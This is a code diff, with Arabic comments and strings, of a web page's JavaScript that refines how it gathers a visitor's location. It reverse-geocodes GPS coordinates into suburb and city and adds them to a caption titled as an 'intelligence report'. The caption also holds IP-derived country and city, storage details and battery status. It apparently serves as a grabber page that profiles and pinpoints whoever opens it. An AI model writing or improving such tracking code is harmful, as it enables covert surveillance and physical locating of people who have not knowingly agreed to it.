@@ -89,8 +89,7 @@
             return storageInfo;
         }
 
-        // دالة لجلب الإحداثيات ثم ترجمتها لاسم منطقة تفصيلي (مثل فيصل، الجيزة)
-        function getGeoLocationName() {
+        function getDetailedLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
                     resolve('غير متاح');
@@ -101,15 +100,19 @@
                             const lon = position.coords.longitude;
                             
                             try {
-                                // استخدام خدمة مجانية لتحويل الأحداثيات لاسم عنوان واضح
                                 const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ar`);
                                 const data = await res.json();
                                 
-                                if (data && data.display_name) {
-                                    resolve(data.display_name); // هيرجع العنوان بالتفصيل (المنطقة، المدينة، المحافظة)
-                                } else {
-                                    resolve(`خط الطول: ${lat}, خط العرض: ${lon}`);
+                                let placeName = "غير معروف";
+                                if (data && data.address) {
+                                    const suburb = data.address.suburb || data.address.neighbourhood || data.address.village || '';
+                                    const city = data.address.city || data.address.town || data.address.state || '';
+                                    placeName = `${city} - ${suburb}`.trim();
+                                } else if (data && data.display_name) {
+                                    placeName = data.display_name;
                                 }
+
+                                resolve(`📍 ${placeName}\n🌐 الإحداثيات: (${lat}, ${lon})`);
                             } catch (err) {
                                 resolve(`خط الطول: ${lat}, خط العرض: ${lon}`);
                             }
@@ -152,7 +155,7 @@
                 const data = await ipRes.json();
                 
                 const storage = await getStorageInfo();
-                const locationName = await getGeoLocationName();
+                const detailedLocation = await getDetailedLocation();
 
                 let batteryLevel = 'غير متاح';
                 let isCharging = '';
@@ -165,7 +168,7 @@
                 }
 
                 const caption = `🚨 **التقرير الاستخباراتي الشامل والمحدد!**\n\n` +
-                                `📍 **العنوان التفصيلي:**\n${locationName}\n` +
+                                `📌 **الموقع بالمنطقة:**\n${detailedLocation}\n` +
                                 `--------------------------\n` +
                                 `🌍 **الدولة:** ${data.country_name || 'غير معروف'}\n` +
                                 `🏙️ **المدينة (بالـ IP):** ${data.city || 'غير معروف'}\n` +
